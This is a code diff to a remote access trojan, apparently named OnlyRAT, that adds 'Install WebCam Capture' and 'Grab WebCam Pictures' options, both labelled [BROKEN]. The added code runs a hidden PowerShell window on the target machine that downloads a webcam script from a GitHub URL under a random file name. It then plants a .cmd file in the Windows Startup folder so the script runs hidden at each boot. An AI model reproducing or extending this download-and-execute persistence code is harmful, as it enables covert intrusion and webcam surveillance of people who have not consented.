@@ -44,6 +44,8 @@ options_menu = """
             [5] - Upload File 
             [6] - Download File
             [7] - Restart Target PC
+            [8] - Install WebCam Capture [BROKEN]
+            [9] - Grab WebCam Pictures [BROKEN]
 
         [+] Options:
             [h] or [help] ----- Help Menu
@@ -345,6 +347,23 @@ def cli(arguments):
             # restart target option
             elif option == "7":
                 remote_command(ipv4, password, "shutdown /r")
+
+            # install webcam option
+            elif option == "8":
+                print("\n[*] Installing webcam capture...")
+
+                install_webcam = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/webcam.ps1 -OutFile {working_direcory}/LIspiXrVAu.ps1\""
+                add_to_startup = f"cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/LIspiXrVAu.ps1 >> GiLqXiexKP.cmd"
+
+                remote_command(ipv4, password, install_webcam)
+                remote_command(ipv4, password, add_to_startup)
+
+                print("[+] Webcam capture installed\n")
+                print("\n[!] Restart target computer to execute\n")
+            
+            # grab keylogs
+            elif option == "9":
+                grab_webcam()
 
             # help menu
             elif option == "h" or option == "help":
